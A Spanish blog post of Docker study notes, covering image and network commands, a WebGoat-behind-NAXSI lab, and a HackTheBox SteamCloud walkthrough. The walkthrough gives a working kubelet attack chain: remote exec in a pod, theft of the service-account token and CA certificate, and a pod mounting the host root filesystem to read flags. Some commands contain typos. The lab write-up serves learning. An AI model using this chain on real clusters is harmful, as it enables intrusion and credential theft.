---
layout: post
author: Sergio Salgado
---

## [](#header-2)Indice
- <a href="#introduccion">Introduccion</a>
- <a href="#descargas_config">Descargas y configuraciones</a>
- <a href="#internal_network">Redes internas de docker</a>

## [](#header-2)<a id="introduccion">Introduccion</a>
Docker es una alternativa a la gestion de contenedores como Parallels que en su momento tambien lo mencionaron en mi maestria. Para gestionar servicios de seguridad como navegadores seguros o verificacion de archivos tambien existe otro SO que se llama QUBES, de linux y contiene las aplicaciones fuera del sistema operativo host, pero te facilita tambien el intercambio de archivos entre estos contenedores.

## [](#header-2)<a id="descargas_config">Descargas y configuraciones</a>
Empezaremos este breve manual descargando una imagen de docker hub con el comando

*Todos los comandos se deben ejecutar con sudo para que el daemon de docker reaccione*

```s
#Imagen de Webgoat de OWASP, este sera nuestro servidor inseguro
sudo docker pull webgoat/webgoat-8.0
sudo docker pull scollazo/naxsi-waf-with-ui
```
Para verificar las imagenes que tenemos descargadas podemos hacer un:

```s
sudo docker image ls
```
Para listar los contenedores que estan corriendo:
```s
docker ps
#Para listar los que estan parados tambien, agregamos la flag -a
docker ps -a
```

Para borrar los contenedores podemos hacer un

```s
#Borrar imagenes
docker image rm ubuntu:22.04
#Borra en contenedores que no se han usado
docker container prune

#Borrar individualmente 
docker rm -f [Container]
```

Para iniciar el WAF y proteger nuestro servidor inseguro, usaremos NAXSI

Para iniciar con una shell iteractiva podemos agregar un 

```s
sudo docker run -it ubuntu:waf_test
```

Para iniciar con un nombre especifico, haremos un

```s
docker run -d --name webGoat webgoat/webgoat-8.0
```

Para iniciar un contenedor con una variable de entorno

```s
docker run -d --name WAF -p [MAquina]:[contenedor] --env WEBSERVER=[nombre contenedro]:[PORT] scollazo/naxsi-waf-with-ui
```

Para publicar una imagen haremos un

```s
sudo docker login
#Para crear nuestra propia version de la imagen primero haremos un
socker tag ubuntu:waf_test rebick/ubuntu:waf_test
sudo docker push rebick/ubuntu:waf_test
```

![Comandos](/assets/images/docker_platzi/carbon%20(3)-975f4d64-9144-4a75-a8ba-0eceba66db50.webp)

Otro asunto importante es que a veces no podemos ver como se configuro una imagen, y para ver como se configuro existen unos tags, para entrar en ellos podemos usar una herramienta llamada <a href="https://github.com/wagoodman/dive.git">dive</a>

## [](#header-2)<a id="internal_network">Redes internas de docker</a>
Docker dispone de interfaces de redes para comunicacion entre los contenedores, para listarlos usaremos el comando

```s
docker network ls
```
Bridge que es el default de docker.

Host es una representacion en docker de la red real de la maquina, si quisiera que un contenedor tuviera acceso a todas las maquinas tendria que permitirle usar esta red.

none, seria para que el contenedor no pudiera tener acceso a la red.

![Network list](/assets/images/docker_platzi/network_ls.png)

Tambien podemos crear nuestra propia red con:

```s
docker network create wafnet
#Para que los contenedores se puedan conectar a esta red solo agregariamos el parametro attachable
docker network create --atachable wafnet
#Para ver las opciones de la red
docker network inspect wafnet
#Para conectar un contenedor a una red
docker network connect wafnet [nombre del contenedor]
```

## [](#header-2)<a id="practica">Practica</a>


Corremos el contenedor del servicio vulnerable, exponemos el puerto 8081 de nuestra maquina y lo visualizamos como el puerto 8080 del contenedor.

```s
sudo docker run -it -p 8081:8080 --name webGOAT webgoat/webgoat-8.0
```

Corremos el contenedor de naxsi y lo configuramos para exponer el puerto 8080 de nuestra maquina y visualizarlo como el 8080 de naxsi.

```s
sudo docker run -e BACKEND_IP=webGOAT -it -p 8080:80 --name naxsi scollazo/naxsi-waf-with-ui
```

Notas de hacking a SteamCloud HacktheBox, contenedores de docker.
El escaneo con nmap, nos trajo el puerto 8443 y 10250, el cual es un API para la gestión de contenedores.
```s
nmap 10.129.96.98 --max-retries=0 -T4 -p-
```

Podemos hacer una consulta al contenedor con 
```s
curl https://10.129.96.98:8443/ -k
curl https://10.129.96.98:10250/pods -k
```

Utilizaremos kubeletctl para descubrir lo que hay dentro de estos pods, para descargarlo usamos el comando con privilegios:
```s
curl -LO
https://github.com/cyberark/kubeletctl/releases/download/v1.7/kubeletctl_linux_amd64
chmod a+x ./kubeletctl_linux_amd64
mv ./kubeletctl_linux_amd64 /usr/local/bin/kubeletctl
```

Ahora veremos la información dentro de los pods con:
```s
kubeletctl --server 10.129.96.98 pods
```

Ahora necesitaremos saber en que pod podemos ejecutar comandos, para ello tenemos el comando
```s
kubeletctl --server 10.129.96.98 scan rce
```

El resultado nos dice que podemos ejecutar comandos en el pod nginx, y para hacerlo usamos el comando:
```s
kubeletctl --server 10.129.96.98 exec "id" -p nginx -c nginx
```
PRIVILEGE ESCALATION
Ahora podemos ver si tenemos acceso a los tokens y certificados y así poder crear una cuenta con permisos altos
Con los siguientes comandos guardaremos y exportaremos en la variable token el token de la consulta, y con el otro comando guardamos el output en el archivo ca.crt
```s
export token=$(kubeletctl --server 10.129.96.98 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx)
kubeletctl --server 10.129.96.98 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx >> ca.crt
```
Nos crearemos un archivo para crear el nuevo contenedor con un archivo f.yml
```yml
apiVersion: v1
kind: Pod
metadata:
name: nginxt
namespace: default
spec:
containers:
- name: nginxt
image: nginx:1.14.2
volumeMounts:
- mountPath: /root
name: mount-root-into-mnt
volumes:
- name: mount-root-into-mnt
hostPath:
path: /
automountServiceAccountToken: true
hostNetwork: true
```

Ahora creamos el contenedor con:
```s
kubectl --token=$token --certificate-authority=ca.crt -- server=https://10.129.96.98:8443 apply -f f.yaml
```
Y listamos para revisar que se haya creado
```s
kubectl --token=$token --certificate-authority=ca.crt -- server=https://10.129.96.98:8443 get pods
```
Y ahora tendremos acceso a las flags.
```s
kubeletctl --server 10.129.96.98 exec "cat /root/home/user/user.txt" -p nginxt -c
nginxt
kubeletctl --server 10.129.96.98 exec "cat /root/root/root.txt" -p nginxt -c nginxt
```

Al final tuve que utilizar la version antes mencionada de kubectl y la reciente del sitio https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/


## [](#header-2)<a id="docker_files">Docker files</a>


## [](#header-2)<a id="docker_vulnerabilities">Docker Common Vulnerabilities</a>
### [](#header-3)<a id="docker_vulnerabilidad_1">Docker Vulnerabilitie 1</a>
Podemos usar la utilidad capsh
```s

```
### [](#header-3)<a id="docker_vulnerabilidad_2">Docker Vulnerabilitie 2</a>
```s

```
### [](#header-3)<a id="docker_vulnerabilidad_3">Docker Vulnerabilitie 3</a>
```s

```
### [](#header-3)<a id="docker_vulnerabilidad_4">Docker Vulnerabilitie 4</a>